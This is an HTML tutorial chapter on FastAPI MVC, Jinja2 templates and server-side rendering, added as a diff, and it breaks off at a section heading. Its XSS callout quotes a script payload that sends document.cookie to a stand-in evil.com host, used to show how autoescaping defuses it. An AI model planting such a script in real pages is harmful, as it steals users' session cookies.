@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chapter 3: MVC Controller Logic &amp; Jinja2 Templates (SSR)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace'],
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-slate-50 text-slate-800 font-sans antialiased leading-relaxed selection:bg-emerald-500 selection:text-white">
+
+    <!-- Top Status Banner -->
+    <div class="bg-slate-950 border-b border-slate-800 text-xs py-2 px-6">
+        <div class="max-w-5xl mx-auto flex flex-wrap justify-between items-center text-slate-400 gap-2">
+            <div class="flex items-center gap-2">
+                <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
+                <span>FastAPI Engineering Series &bull; Production Track</span>
+            </div>
+            <div class="font-mono text-[11px] text-slate-400">
+                Project Tracker: <span class="text-emerald-400 font-semibold">NoteVault (Milestone 03 - SSR Dashboard)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="bg-slate-900 text-white py-16 px-6 shadow-xl border-b border-slate-800 relative overflow-hidden">
+        <div class="absolute -right-20 -top-20 w-96 h-96 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+        <div class="max-w-5xl mx-auto relative z-10">
+            <div class="inline-flex items-center gap-2 px-3 py-1 mb-4 text-xs font-mono font-semibold tracking-widest uppercase bg-emerald-500/10 text-emerald-400 rounded-full border border-emerald-500/20">
+                Chapter 03 &bull; MVC &amp; Server-Side Rendering
+            </div>
+            <h1 class="text-4xl sm:text-5xl font-extrabold tracking-tight mt-2 mb-4">
+                MVC Controller Logic &amp; Jinja2 Templates
+            </h1>
+            <p class="text-slate-300 text-lg max-w-3xl leading-relaxed">
+                Separating concerns with architectural discipline: How Jinja2 compiles templates into Python bytecode, the mechanics of Server-Side Rendering (SSR) vs. Client-Side Rendering (CSR), and building NoteVault's web interface.
+            </p>
+        </div>
+    </header>
+
+    <main class="max-w-5xl mx-auto px-6 py-14 space-y-20">
+
+        <!-- Series Project Roadmap Callout -->
+        <section class="bg-gradient-to-br from-slate-900 to-slate-800 text-white rounded-3xl p-8 border border-slate-700 shadow-xl relative overflow-hidden">
+            <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
+                <div class="space-y-2">
+                    <span class="text-xs uppercase font-mono tracking-widest text-emerald-400 font-bold">Continuous Project Build</span>
+                    <h2 class="text-2xl font-extrabold">NoteVault Milestone 03: The Web Dashboard</h2>
+                    <p class="text-slate-300 text-sm max-w-2xl">
+                        APIs are only half the battle. Many operational tools, admin portals, and internal consoles rely on high-speed Server-Side Rendering (SSR). In this chapter, we add <code class="font-mono text-emerald-300 bg-slate-950 px-1.5 py-0.5 rounded">templates/</code> and modularize our views so NoteVault serves both pure JSON endpoints (<code class="font-mono text-purple-300">/api/v1/notes</code>) and rich HTML dashboards (<code class="font-mono text-purple-300">/notes</code>) using Jinja2 inheritance.
+                    </p>
+                </div>
+                <div class="bg-slate-950/80 border border-slate-700 p-4 rounded-2xl font-mono text-xs text-slate-300 min-w-[260px]">
+                    <div class="text-emerald-400 font-bold mb-2 pb-1 border-b border-slate-800">// Milestone 03 Deliverables</div>
+                    <ul class="space-y-1.5 text-[11px]">
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> MVC &amp; SSR mental models</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Jinja2 bytecode &amp; autoescape</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Template layout inheritance</li>
+                        <li class="flex items-center gap-1.5"><span class="text-emerald-400">&check;</span> Modern <code class="text-purple-300">TemplateResponse</code> syntax</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- 1. The Computer Science of MVC and Rendering -->
+        <section id="cs-mvc-ssr" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Part 01</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Architecture: The MVC Pattern &amp; Rendering Engines</h2>
+            </div>
+            
+            <p class="text-slate-700 leading-relaxed">
+                When building user-facing systems, mixing SQL statements, validation logic, and raw HTML markup inside a single controller creates what software engineers call <strong>"Spaghetti Code"</strong>. The <strong>Model-View-Controller (MVC)</strong> architectural pattern enforces strict separation of concerns:
+            </p>
+
+            <!-- MVC Triad Cards -->
+            <div class="grid md:grid-cols-3 gap-6">
+                <!-- Model -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                    <div class="w-8 h-8 rounded-lg bg-emerald-100 text-emerald-800 flex items-center justify-center font-mono font-bold text-sm">M</div>
+                    <h3 class="font-bold text-slate-900 text-base">Model (Data Core)</h3>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        The single source of truth for business data, rules, and database schema. It has zero knowledge of how data is displayed. In NoteVault, our Model layer consists of our Pydantic schemas and in-memory datastore (evolving into SQLAlchemy in Chapter 6).
+                    </p>
+                </div>
+
+                <!-- View -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                    <div class="w-8 h-8 rounded-lg bg-purple-100 text-purple-800 flex items-center justify-center font-mono font-bold text-sm">V</div>
+                    <h3 class="font-bold text-slate-900 text-base">View (Presentation)</h3>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        The visual interface consumed by humans or user agents. In API mode, the View is an outgoing JSON payload. In SSR mode, the View is a Jinja2 HTML template with slots and layout blocks. The View never queries a database directly.
+                    </p>
+                </div>
+
+                <!-- Controller -->
+                <div class="bg-white p-6 rounded-2xl border border-slate-200 shadow-sm space-y-2">
+                    <div class="w-8 h-8 rounded-lg bg-sky-100 text-sky-800 flex items-center justify-center font-mono font-bold text-sm">C</div>
+                    <h3 class="font-bold text-slate-900 text-base">Controller (Coordinator)</h3>
+                    <p class="text-xs text-slate-600 leading-relaxed">
+                        The orchestrator. In FastAPI, your route functions (<code class="font-mono text-slate-800">async def ...</code>) act as the Controllers. They receive the incoming HTTP Request, query or mutate the Model, and pass the data (the "context") into the View.
+                    </p>
+                </div>
+            </div>
+
+            <!-- SSR vs CSR Comparison -->
+            <div class="bg-slate-900 p-8 rounded-3xl text-white shadow-xl space-y-4">
+                <div class="text-emerald-400 font-mono font-bold uppercase tracking-widest text-xs text-center">
+                    Engineering Decision: SSR vs. CSR
+                </div>
+                <div class="grid md:grid-cols-2 gap-6 text-xs font-mono pt-2">
+                    <div class="space-y-2 border border-slate-800 p-4 rounded-xl bg-slate-950/60">
+                        <span class="text-sky-300 font-bold block text-sm">Server-Side Rendering (SSR / Jinja2)</span>
+                        <p class="text-slate-400 font-sans leading-relaxed text-[11px]">
+                            The server compiles and fills data placeholders into the HTML string before the first byte leaves the server. The browser receives complete, indexable HTML instantly.
+                        </p>
+                        <div class="text-emerald-400 text-[10px]">
+                            &plus; Fast First-Contentful-Paint (FCP)<br>
+                            &plus; 100% SEO friendly out-of-the-box<br>
+                            &minus; Higher server CPU usage under extreme traffic
+                        </div>
+                    </div>
+                    <div class="space-y-2 border border-slate-800 p-4 rounded-xl bg-slate-950/60">
+                        <span class="text-purple-300 font-bold block text-sm">Client-Side Rendering (CSR / React / Vue)</span>
+                        <p class="text-slate-400 font-sans leading-relaxed text-[11px]">
+                            The server serves an empty <code class="text-slate-300">&lt;div id="root"&gt;&lt;/div&gt;</code> and a 2MB JavaScript bundle. The browser downloads the script, renders elements, and fetches JSON from the API.
+                        </p>
+                        <div class="text-amber-400 text-[10px]">
+                            &plus; Offloads rendering compute to user devices<br>
+                            &minus; Slow initial load on mobile/bad connections<br>
+                            &minus; Complex build tooling (Webpack/Vite/Node)
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. Inside the Jinja2 Engine: Lexing, Parsing & Compilation -->
+        <section id="jinja2-internals" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Part 02</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Inside Jinja2: How Templates Are Compiled</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed">
+                Many developers believe template engines use regular expressions to find and replace tags like <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-purple-700">{{ title }}</code>. If Jinja2 used regex, high-traffic pages would bring servers to a halt. 
+            </p>
+
+            <!-- Detailed Visual Lifecycle Diagram -->
+            <div class="bg-white p-8 rounded-3xl border border-slate-200 shadow-sm space-y-6">
+                <div class="text-center font-mono text-xs uppercase tracking-widest text-slate-500 font-bold">
+                    The Jinja2 Compilation Pipeline
+                </div>
+
+                <div class="flex flex-col md:flex-row items-center justify-between gap-2 font-mono text-xs">
+                    <div class="p-3 bg-sky-50 border border-sky-200 rounded-xl text-center w-full md:w-40">
+                        <span class="text-sky-900 font-bold block">1. Template File</span>
+                        <span class="text-[10px] text-slate-500">Raw HTML + Tags</span>
+                    </div>
+                    <div class="text-slate-400 font-bold">&rarr;</div>
+                    <div class="p-3 bg-indigo-50 border border-indigo-200 rounded-xl text-center w-full md:w-44">
+                        <span class="text-indigo-900 font-bold block">2. Lexer &amp; Parser</span>
+                        <span class="text-[10px] text-slate-500">Builds Abstract Syntax Tree</span>
+                    </div>
+                    <div class="text-slate-400 font-bold">&rarr;</div>
+                    <div class="p-3 bg-purple-50 border border-purple-200 rounded-xl text-center w-full md:w-48">
+                        <span class="text-purple-900 font-bold block">3. Code Generation</span>
+                        <span class="text-[10px] text-slate-500">Compiles to Python Bytecode</span>
+                    </div>
+                    <div class="text-slate-400 font-bold">&rarr;</div>
+                    <div class="p-3 bg-emerald-50 border border-emerald-200 rounded-xl text-center w-full md:w-44">
+                        <span class="text-emerald-900 font-bold block">4. Hydration</span>
+                        <span class="text-[10px] text-slate-500">Executes with Context Dict</span>
+                    </div>
+                </div>
+
+                <div class="bg-slate-50 p-4 rounded-xl text-xs text-slate-600 border border-slate-200 space-y-2">
+                    <p><strong>Why this matters for backend performance:</strong></p>
+                    <p class="text-[11px] leading-relaxed">
+                        Jinja2 reads your HTML file from disk <em>only once</em>. It converts the template into pure Python bytecode and stores it in an in-memory cache. Every subsequent request executes that compiled bytecode directly against the incoming dictionary context. This makes Jinja2 one of the fastest template engines in any language.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Autoescape & XSS Defense -->
+            <div class="bg-amber-50 border-l-4 border-amber-500 p-6 rounded-r-2xl space-y-3">
+                <h3 class="font-bold text-amber-900 text-sm flex items-center gap-2">
+                    <span>&#128737;&#65039;</span>
+                    Automatic Escaping: Defeating Cross-Site Scripting (XSS)
+                </h3>
+                <p class="text-xs text-amber-900 leading-relaxed">
+                    If an attacker submits a note containing: <code class="font-mono bg-amber-100 px-1 py-0.5 rounded text-amber-950">&lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code>, what happens?
+                </p>
+                <p class="text-xs text-amber-900 leading-relaxed">
+                    By default, FastAPI's <code class="font-mono font-bold">Jinja2Templates</code> enables autoescaping for HTML and XML files. Jinja2 automatically converts hazardous characters before output:
+                </p>
+                <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 font-mono text-[11px] text-amber-950 pt-1">
+                    <div class="bg-white/70 p-2 rounded border border-amber-200 text-center">&lt; &rarr; &amp;lt;</div>
+                    <div class="bg-white/70 p-2 rounded border border-amber-200 text-center">&gt; &rarr; &amp;gt;</div>
+                    <div class="bg-white/70 p-2 rounded border border-amber-200 text-center">&amp; &rarr; &amp;amp;</div>
+                    <div class="bg-white/70 p-2 rounded border border-amber-200 text-center">&quot; &rarr; &amp;quot;</div>
+                </div>
+                <p class="text-[11px] text-amber-800 italic">
+                    The browser displays the script safely as literal text rather than executing it. Never use the <code class="font-mono font-bold text-rose-700">| safe</code> filter on untrusted user-submitted input!
+                </p>
+            </div>
+        </section>
+
+        <!-- 3. Modern Starlette/FastAPI TemplateResponse Signature Changes -->
+        <section id="starlette-changes" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Part 03</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Official Library Note: Modern TemplateResponse Syntax</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed">
+                If you look at old tutorials (or AI code generated on older training data), you will see:
+                <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-rose-600">templates.TemplateResponse("index.html", {"request": request, "notes": notes})</code>.
+                In modern Starlette and FastAPI versions, this signature was formally updated.
+            </p>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Legacy Syntax -->
+                <div class="bg-rose-50 border border-rose-200 p-5 rounded-2xl space-y-2">
+                    <div class="text-xs font-mono font-bold text-rose-700 uppercase tracking-wide">Legacy Syntax (Deprecated / Legacy Starlette)</div>
+                    <pre class="bg-slate-900 text-rose-300 p-3.5 rounded-xl font-mono text-xs overflow-x-auto">
+<span class="text-slate-500"># DEPRECATED: Context passed as positional argument #2</span>
+<span class="text-purple-400">return</span> templates.TemplateResponse(
+    <span class="text-amber-300">"notes.html"</span>, 
+    {<span class="text-amber-300">"request"</span>: request, <span class="text-amber-300">"items"</span>: items}
+)</pre>
+                    <p class="text-[11px] text-rose-800">
+                        In this older syntax, omitting the <code class="font-mono text-[10px]">request</code> key inside the context dictionary triggered runtime crashes during template URL generation.
+                    </p>
+                </div>
+
+                <!-- Modern Syntax -->
+                <div class="bg-emerald-50 border border-emerald-200 p-5 rounded-2xl space-y-2">
+                    <div class="text-xs font-mono font-bold text-emerald-700 uppercase tracking-wide">Modern Syntax (Starlette &gt;= 0.28.0 &amp; FastAPI)</div>
+                    <pre class="bg-slate-900 text-emerald-300 p-3.5 rounded-xl font-mono text-xs overflow-x-auto">
+<span class="text-slate-500"># MODERN: request is an explicit keyword parameter</span>
+<span class="text-purple-400">return</span> templates.TemplateResponse(
+    request=request, 
+    name=<span class="text-amber-300">"notes.html"</span>, 
+    context={<span class="text-amber-300">"items"</span>: items}
+)</pre>
+                    <p class="text-[11px] text-emerald-800">
+                        Passing <code class="font-mono text-[10px]">request=request</code> as a first-class keyword argument guarantees type safety and ensures internal Jinja helpers (like <code class="font-mono text-[10px]">url_for()</code>) have immediate connection access.
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4. Project Implementation: Templates Structure -->
+        <section id="templates-implementation" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Part 04</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">NoteVault Milestone 03: Templates &amp; Layout Inheritance</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed">
+                Never duplicate headers, navigation bars, CSS links, and footers across pages. Jinja2 provides <strong>Template Inheritance</strong> using <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-purple-700">{% extends %}</code> and <code class="font-mono text-xs bg-slate-100 px-1 py-0.5 rounded text-purple-700">{% block %}</code>.
+            </p>
+
+            <div class="bg-slate-900 p-5 rounded-2xl text-slate-300 font-mono text-xs space-y-1 border border-slate-800">
+                <div class="text-emerald-400 font-bold mb-2">// Updated Project Hierarchy</div>
+                <div>notevault_backend/</div>
+                <div>├── app/</div>
+                <div>│   ├── __init__.py</div>
+                <div>│   ├── config.py</div>
+                <div>│   ├── schemas.py</div>
+                <div>│   └── main.py</div>
+                <div>└── <span class="text-emerald-300 font-bold">templates/</span>                  <span class="text-slate-500"># Dedicated Jinja2 view directory</span></div>
+                <div>    ├── <span class="text-purple-300">base.html</span>                 <span class="text-slate-500"># Parent master layout skeleton (Navbar, Footer, CSS)</span></div>
+                <div>    └── <span class="text-purple-300">notes_dashboard.html</span>      <span class="text-slate-500"># Child page: Injects dynamic note cards into base</span></div>
+            </div>
+
+            <!-- Template 1: base.html -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">1. Master Layout: <code class="text-purple-700">templates/base.html</code></span>
+                    <span class="text-slate-400">Parent Scaffold</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-lg">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en" class="h-full bg-slate-50"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;title&gt;{% block title %}{{ app_name }}{% endblock %}&lt;/title&gt;
+    &lt;!-- Tailwind CSS CDN for instant styling --&gt;
+    &lt;script src="https://cdn.tailwindcss.com"&gt;&lt;/script&gt;
+&lt;/head&gt;
+&lt;body class="h-full flex flex-col font-sans text-slate-800 antialiased"&gt;
+
+    &lt;!-- Global Top Navigation --&gt;
+    &lt;nav class="bg-slate-900 text-white border-b border-slate-800"&gt;
+        &lt;div class="max-w-5xl mx-auto px-6 h-16 flex items-center justify-between"&gt;
+            &lt;div class="flex items-center gap-3"&gt;
+                &lt;span class="w-3 h-3 rounded-full bg-emerald-400"&gt;&lt;/span&gt;
+                &lt;span class="font-bold text-lg tracking-tight"&gt;NoteVault Dashboard&lt;/span&gt;
+            &lt;/div&gt;
+            &lt;div class="flex items-center gap-4 text-xs font-mono"&gt;
+                &lt;a href="/notes" class="text-slate-300 hover:text-emerald-400 transition"&gt;Dashboard&lt;/a&gt;
+                &lt;a href="/docs" target="_blank" class="text-slate-300 hover:text-emerald-400 transition"&gt;API Docs&lt;/a&gt;
+                &lt;span class="px-2 py-0.5 rounded bg-slate-800 text-slate-400 border border-slate-700"&gt;{{ environment }}&lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;!-- Main Content Placeholder: Child templates override this block --&gt;
+    &lt;main class="flex-1 max-w-5xl w-full mx-auto px-6 py-8"&gt;
+        {% block content %}
+        &lt;!-- Child template contents inject here --&gt;
+        {% endblock %}
+    &lt;/main&gt;
+
+    &lt;!-- Shared Global Footer --&gt;
+    &lt;footer class="border-t border-slate-200 bg-white py-4 text-center text-xs text-slate-400"&gt;
+        NoteVault Engineering Series &bull; Powered by FastAPI &amp;amp; Jinja2
+    &lt;/footer&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+            </div>
+
+            <!-- Template 2: notes_dashboard.html -->
+            <div class="space-y-2">
+                <div class="flex items-center justify-between text-xs font-mono">
+                    <span class="font-bold text-slate-800">2. Child Page: <code class="text-purple-700">templates/notes_dashboard.html</code></span>
+                    <span class="text-slate-400">Content Hydration</span>
+                </div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-lg">
+{% extends "base.html" %}
+
+{% block title %}Notes Dashboard | {{ app_name }}{% endblock %}
+
+{% block content %}
+&lt;div class="space-y-6"&gt;
+    &lt;div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-200 pb-4"&gt;
+        &lt;div&gt;
+            &lt;h1 class="text-2xl font-bold text-slate-900"&gt;All Knowledge Notes&lt;/h1&gt;
+            &lt;p class="text-xs text-slate-500 mt-1"&gt;Total stored records: {{ notes|length }}&lt;/p&gt;
+        &lt;/div&gt;
+        &lt;!-- Search Filter Form (Server-Side Form submission) --&gt;
+        &lt;form method="get" action="/notes" class="flex gap-2"&gt;
+            &lt;input 
+                type="text" 
+                name="search" 
+                value="{{ search_query or '' }}" 
+                placeholder="Search notes..." 
+                class="px-3 py-1.5 text-xs rounded-lg border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-500 w-48 sm:w-64"
+            /&gt;
+            &lt;button type="submit" class="px-3 py-1.5 bg-slate-900 hover:bg-slate-800 text-white rounded-lg text-xs font-bold transition"&gt;
+                Filter
+            &lt;/button&gt;
+            {% if search_query %}
+            &lt;a href="/notes" class="px-2 py-1.5 text-xs text-slate-500 hover:text-rose-600 flex items-center"&gt;Clear&lt;/a&gt;
+            {% endif %}
+        &lt;/form&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Jinja2 Conditional Logic --&gt;
+    {% if notes %}
+    &lt;div class="grid sm:grid-cols-2 gap-4"&gt;
+        {% for note in notes %}
+        &lt;div class="bg-white p-5 rounded-xl border border-slate-200 shadow-sm hover:border-emerald-500 transition space-y-3"&gt;
+            &lt;div class="flex items-start justify-between gap-2"&gt;
+                &lt;h3 class="font-bold text-slate-900 text-sm"&gt;{{ note.title }}&lt;/h3&gt;
+                &lt;span class="px-2 py-0.5 rounded text-[10px] font-mono font-bold {% if note.priority &gt;= 4 %}bg-rose-100 text-rose-700{% else %}bg-slate-100 text-slate-600{% endif %}"&gt;
+                    P{{ note.priority }}
+                &lt;/span&gt;
+            &lt;/div&gt;
+            &lt;p class="text-xs text-slate-600 leading-relaxed"&gt;{{ note.content }}&lt;/p&gt;
+            
+            &lt;!-- Dynamic Tag Badges --&gt;
+            &lt;div class="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-slate-100 text-[10px]"&gt;
+                &lt;div class="flex flex-wrap gap-1"&gt;
+                    {% for tag in note.tags %}
+                    &lt;span class="px-1.5 py-0.5 rounded bg-emerald-50 text-emerald-700 font-mono"&gt;#{{ tag }}&lt;/span&gt;
+                    {% endfor %}
+                &lt;/div&gt;
+                &lt;span class="text-slate-400 font-mono"&gt;ID: {{ note.id }}&lt;/span&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+        {% endfor %}
+    &lt;/div&gt;
+    {% else %}
+    &lt;div class="bg-white p-12 rounded-2xl border border-dashed border-slate-300 text-center space-y-2"&gt;
+        &lt;p class="text-slate-500 text-xs"&gt;No notes matched your criteria.&lt;/p&gt;
+        &lt;a href="/notes" class="text-xs text-emerald-600 font-bold hover:underline"&gt;Reset filters&lt;/a&gt;
+    &lt;/div&gt;
+    {% endif %}
+&lt;/div&gt;
+{% endblock %}</pre>
+            </div>
+        </section>
+
+        <!-- 5. Refactored app/main.py with Template Endpoints -->
+        <section id="main-refactor" class="space-y-6">
+            <div class="border-b border-slate-200 pb-3">
+                <span class="text-emerald-600 font-mono text-xs font-bold uppercase tracking-wider">Part 05</span>
+                <h2 class="text-3xl font-bold text-slate-900 mt-1">Wiring the Controller: app/main.py (Milestone 03)</h2>
+            </div>
+
+            <p class="text-slate-700 leading-relaxed">
+                Here is the updated <code class="font-mono text-xs bg-slate-100 px-1.5 py-0.5 rounded font-bold text-slate-800">app/main.py</code>. We initialize <code class="font-mono text-xs text-purple-700 font-bold">Jinja2Templates</code>, serve the SSR Dashboard at <code class="font-mono text-xs text-emerald-700 font-bold">/notes</code>, and keep our pure REST API at <code class="font-mono text-xs text-sky-700 font-bold">/api/v1/notes</code>.
+            </p>
+
+            <div class="relative">
+                <div class="absolute top-3 right-4 text-[10px] font-mono text-slate-400 uppercase tracking-widest bg-slate-800 px-2 py-0.5 rounded">app/main.py</div>
+                <pre class="bg-slate-900 text-slate-100 p-6 rounded-2xl font-mono text-xs overflow-x-auto leading-relaxed border border-slate-800 shadow-xl">
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># NoteVault Backend - Milestone 03 (MVC Controller &amp; SSR Templates)</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">from</span> typing <span class="text-purple-400">import</span> Optional, List
+<span class="text-purple-400">from</span> datetime <span class="text-purple-400">import</span> datetime, timezone
+<span class="text-purple-400">from</span> fastapi <span class="text-purple-400">import</span> FastAPI, Request, HTTPException, status, Query, Path
+<span class="text-purple-400">from</span> fastapi.responses <span class="text-purple-400">import</span> HTMLResponse
+<span class="text-purple-400">from</span> fastapi.templating <span class="text-purple-400">import</span> Jinja2Templates
+<span class="text-purple-400">from</span> app.config <span class="text-purple-400">import</span> settings
+<span class="text-purple-400">from</span> app.schemas <span class="text-purple-400">import</span> NoteCreate, NoteUpdate, NoteResponse
+
+app = FastAPI(
+    title=settings.APP_NAME,
+    description=<span class="text-amber-300">"Production knowledge vault with REST API and SSR web views."</span>,
+    version=<span class="text-amber-300">"1.2.0"</span>,
+)
+
+<span class="text-slate-500"># 1. Initialize Jinja2 Template Environment</span>
+<span class="text-slate-500"># directory="templates" points to our root templates folder</span>
+templates = Jinja2Templates(directory=<span class="text-amber-300">"templates"</span>)
+
+<span class="text-slate-500"># In-memory store (Preserved across milestones)</span>
+NOTE_DATABASE: dict[int, dict] = {
+    1: {
+        <span class="text-amber-300">"id"</span>: 1,
+        <span class="text-amber-300">"title"</span>: <span class="text-amber-300">"FastAPI Architecture Rules"</span>,
+        <span class="text-amber-300">"content"</span>: <span class="text-amber-300">"Always validate input boundaries; keep business logic modular."</span>,
+        <span class="text-amber-300">"tags"</span>: [<span class="text-amber-300">"backend"</span>, <span class="text-amber-300">"python"</span>],
+        <span class="text-amber-300">"priority"</span>: 2,
+        <span class="text-amber-300">"created_at"</span>: datetime.now(timezone.utc),
+        <span class="text-amber-300">"updated_at"</span>: <span class="text-rose-400">None</span>,
+        <span class="text-amber-300">"is_archived"</span>: <span class="text-rose-400">False</span>,
+    },
+    2: {
+        <span class="text-amber-300">"id"</span>: 2,
+        <span class="text-amber-300">"title"</span>: <span class="text-amber-300">"Template Engine Mechanics"</span>,
+        <span class="text-amber-300">"content"</span>: <span class="text-amber-300">"Jinja2 compiles AST trees to Python bytecode for high-throughput SSR."</span>,
+        <span class="text-amber-300">"tags"</span>: [<span class="text-amber-300">"architecture"</span>, <span class="text-amber-300">"templates"</span>],
+        <span class="text-amber-300">"priority"</span>: 5,
+        <span class="text-amber-300">"created_at"</span>: datetime.now(timezone.utc),
+        <span class="text-amber-300">"updated_at"</span>: <span class="text-rose-400">None</span>,
+        <span class="text-amber-300">"is_archived"</span>: <span class="text-rose-400">False</span>,
+    }
+}
+NOTE_ID_COUNTER = 2
+
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># MVC Controller: Web View (HTML SSR)</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">@app.get</span>(<span class="text-amber-300">"/notes"</span>, response_class=HTMLResponse, tags=[<span class="text-amber-300">"Web Views"</span>], include_in_schema=<span class="text-rose-400">False</span>)
+<span class="text-purple-400">async def</span> <span class="text-sky-300 font-bold">render_notes_dashboard</span>(
+    request: Request,
+    search: Optional[str] = Query(<span class="text-rose-400">None</span>)
+):
+    <span class="text-slate-500">"""
+    MVC Controller Action:
+    1. Queries the Model layer (in-memory store)
+    2. Packages data into the View context
+    3. Renders and returns a compiled HTML document
+    """</span>
+    notes = list(NOTE_DATABASE.values())
+    <span class="text-purple-400">if</span> search:
+        q = search.lower()
+        notes = [
+            n <span class="text-purple-400">for</span> n <span class="text-purple-400">in</span> notes 
+            <span class="text-purple-400">if</span> q <span class="text-purple-400">in</span> n[<span class="text-amber-300">"title"</span>].lower() <span class="text-purple-400">or</span> q <span class="text-purple-400">in</span> n[<span class="text-amber-300">"content"</span>].lower()
+        ]
+
+    <span class="text-slate-500"># Modern TemplateResponse syntax using explicit keyword arguments</span>
+    <span class="text-purple-400">return</span> templates.TemplateResponse(
+        request=request,
+        name=<span class="text-amber-300">"notes_dashboard.html"</span>,
+        context={
+            <span class="text-amber-300">"app_name"</span>: settings.APP_NAME,
+            <span class="text-amber-300">"environment"</span>: settings.ENVIRONMENT,
+            <span class="text-amber-300">"notes"</span>: notes,
+            <span class="text-amber-300">"search_query"</span>: search,
+        }
+    )
+
+<span class="text-slate-500"># ==============================================================================</span>
+<span class="text-slate-500"># REST API Endpoints (Pure JSON Boundary)</span>
+<span class="text-slate-500"># ==============================================================================</span>
+
+<span class="text-purple-400">@app.post</span>(
+    f<span class="text-amber-300">"{settings.API_V1_PREFIX}/notes"</span>,
+    response_model=NoteResponse,
+    status_code=status.HTTP_201_CREATED,
+    tags=[<span class="text-amber-300">"Notes API"</span>]
+)
+<span class="text-purple-400">async def</span> <span class="text-sky-300 font-bold">api_create_note</span>(payload: NoteCreate):
+    <span class="text-purple-400">global</span> NOTE_ID_COUNTER
+    NOTE_ID_COUNTER += 1
+
+    new_record = payload.model_dump()
+    new_record.update({
+        <span class="text-amber-300">"id"</span>: NOTE_ID_COUNTER,
+        <span class="text-amber-300">"is_archived"</span>: <span class="text-rose-400">False</span>,
+        <span class="text-amber-300">"created_at"</span>: datetime.now(timezone.utc),
+        <span class="text-amber-300">"updated_at"</span>: <span class="text-rose-400">None</span>,
+    })
+    NOTE_DATABASE[NOTE_ID_COUNTER] = new_record
+    <span class="text-purple-400">return</span> new_record
+
+
+<span class="text-purple-400">@app.get</span>(
+    f<span class="text-amber-300">"{settings.API_V1_PREFIX}/notes"</span>,
+    response_model=List[NoteResponse],
+    tags=[<span class="text-amber-300">"Notes API"</span>]
+)
+<span class="text-purple-400">async def</span> <span class="text-sky-300 font-bold">api_list_notes</span>():
+    <span class="text-purple-400">return</span> list(NOTE_DATABASE.values())</pre>
+            </div>
+        </section>
+
+        <!-- 6. Common Gotchas & Anti-Patterns -->
